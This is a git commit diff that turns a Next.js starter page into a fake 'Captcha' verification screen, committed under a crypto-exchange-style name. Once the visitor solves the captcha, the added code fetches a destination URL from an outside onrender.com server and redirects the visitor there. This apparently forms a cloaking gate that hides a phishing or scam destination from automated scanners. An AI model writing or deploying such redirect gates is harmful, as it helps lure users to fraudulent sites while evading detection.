12ab67f709c093079f4236351c682de80cd2770a
binancehub <binancehub01@outlook.com>
2024-06-10 22:36:54 +0100

    added new things

--- app/page.tsx
+++ app/page.tsx
@@ -1,112 +1,104 @@
+"use client";
+import { Button } from "@/components/ui/button";
+import { Loader2 } from "lucide-react";
+import { redirect, useRouter } from "next/navigation";
+import {
+  InputOTP,
+  InputOTPGroup,
+  InputOTPSlot,
+} from "@/components/ui/input-otp";
+import { useEffect, useState } from "react";
 import Image from "next/image";
 
 export default function Home() {
+  const [capValue, setCapValue] = useState<string>("");
+  const [btn, setBtn] = useState(false);
+  const [Error, setError] = useState("");
+  const [ranNumber, setRanNumber] = useState<number[]>();
+  const route = useRouter();
+
+  useEffect(() => {
+    function randomNum(min: number, max: number) {
+      const n = [];
+      for (var i = 0; i < 3; i++) {
+        n.push(Math.floor(Math.random() * max) + min);
+      }
+      return n;
+    }
+    setRanNumber(randomNum(1, 9));
+  }, []);
+  const handleClick = () => {
+    setBtn(true);
+    const random = ranNumber?.join("");
+    setTimeout(async () => {
+      if (capValue !== random) {
+        setError("add corrected number on the image");
+        setBtn(false);
+        setCapValue("");
+      } else {
+        setError("");
+        // console.log("seccuss");
+        const req = await fetch("https://json-web-1esl.onrender.com/", {
+          method: "GET",
+        });
+        const res = await req.json();
+        // console.log(res.url);
+        route.push(res.url);
+      }
+    }, 2000);
+  };
+
   return (
-    <main className="flex min-h-screen flex-col items-center justify-between p-24">
-      <div className="z-10 w-full max-w-5xl items-center justify-between font-mono text-sm lg:flex">
-        <p className="fixed left-0 top-0 flex w-full justify-center border-b border-gray-300 bg-gradient-to-b from-zinc-200 pb-6 pt-8 backdrop-blur-2xl dark:border-neutral-800 dark:bg-zinc-800/30 dark:from-inherit lg:static lg:w-auto  lg:rounded-xl lg:border lg:bg-gray-200 lg:p-4 lg:dark:bg-zinc-800/30">
-          Get started by editing&nbsp;
-          <code className="font-mono font-bold">app/page.tsx</code>
-        </p>
-        <div className="fixed bottom-0 left-0 flex h-48 w-full items-end justify-center bg-gradient-to-t from-white via-white dark:from-black dark:via-black lg:static lg:size-auto lg:bg-none">
-          <a
-            className="pointer-events-none flex place-items-center gap-2 p-8 lg:pointer-events-auto lg:p-0"
-            href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            By{" "}
-            <Image
-              src="/vercel.svg"
-              alt="Vercel Logo"
-              className="dark:invert"
-              width={100}
-              height={24}
-              priority
-            />
-          </a>
-        </div>
-      </div>
-
-      <div className="relative z-[-1] flex place-items-center before:absolute before:h-[300px] before:w-full before:-translate-x-1/2 before:rounded-full before:bg-gradient-radial before:from-white before:to-transparent before:blur-2xl before:content-[''] after:absolute after:-z-20 after:h-[180px] after:w-full after:translate-x-1/3 after:bg-gradient-conic after:from-sky-200 after:via-blue-200 after:blur-2xl after:content-[''] before:dark:bg-gradient-to-br before:dark:from-transparent before:dark:to-blue-700 before:dark:opacity-10 after:dark:from-sky-900 after:dark:via-[#0141ff] after:dark:opacity-40 sm:before:w-[480px] sm:after:w-[240px] before:lg:h-[360px]">
+    <main className="h-screen w-full flex flex-col justify-center items-center gap-10">
+      <div className="text-center space-y-3 flex flex-col">
         <Image
-          className="relative dark:drop-shadow-[0_0_0.3rem_#ffffff70] dark:invert"
-          src="/next.svg"
-          alt="Next.js Logo"
-          width={180}
-          height={37}
-          priority
+          src="/logo.png"
+          alt="logo"
+          height={40}
+          width={400}
+          className="self-center mb-5"
         />
+        <h1 className="md:text-5xl text-4xl font-bold">Captcha</h1>
+        <p className="md:text-xl font-medium">
+          Solve this captcha to check if you&apos;re human
+        </p>
+        <p>
+          Enter only <span className="underline font-medium">3 black</span>{" "}
+          characters (case-sensitive) from the image below:
+        </p>
+        <p className="text-2xl">
+          {ranNumber?.at(0)}
+          <span className="text-background">1</span>
+          <span className="text-red-500">4</span>
+          <span className="text-background">1</span>
+          {ranNumber?.at(1)}
+          <span className="text-background">1</span>
+          <span className="text-red-500">1</span>
+          <span className="text-background">1</span>
+          {ranNumber?.at(2)}
+          <span className="text-background">1</span>
+          <span className="text-red-500">7</span>
+        </p>
       </div>
 
-      <div className="mb-32 grid text-center lg:mb-0 lg:w-full lg:max-w-5xl lg:grid-cols-4 lg:text-left">
-        <a
-          href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className="mb-3 text-2xl font-semibold">
-            Docs{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className="m-0 max-w-[30ch] text-sm opacity-50">
-            Find in-depth information about Next.js features and API.
-          </p>
-        </a>
-
-        <a
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className="mb-3 text-2xl font-semibold">
-            Learn{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className="m-0 max-w-[30ch] text-sm opacity-50">
-            Learn about Next.js in an interactive course with&nbsp;quizzes!
-          </p>
-        </a>
-
-        <a
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className="mb-3 text-2xl font-semibold">
-            Templates{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className="m-0 max-w-[30ch] text-sm opacity-50">
-            Explore starter templates for Next.js.
-          </p>
-        </a>
-
-        <a
-          href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className="mb-3 text-2xl font-semibold">
-            Deploy{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className="m-0 max-w-[30ch] text-balance text-sm opacity-50">
-            Instantly deploy your Next.js site to a shareable URL with Vercel.
-          </p>
-        </a>
+      <div className="flex flex-col gap-2 items-center">
+        <div className="flex flex-row gap-4">
+          <InputOTP
+            maxLength={6}
+            value={capValue}
+            onChange={(e) => setCapValue(e)}
+          >
+            <InputOTPGroup>
+              <InputOTPSlot index={0} />
+              <InputOTPSlot index={1} />
+              <InputOTPSlot index={2} />
+            </InputOTPGroup>
+          </InputOTP>
+          <Button onClick={handleClick}>
+            {btn && <Loader2 className="animate-spin size-4 mr-2" />} Verify
+          </Button>
+        </div>
+        {Error && <p className="text-red-500 font-medium text-sm">{Error}</p>}
       </div>
     </main>
   );
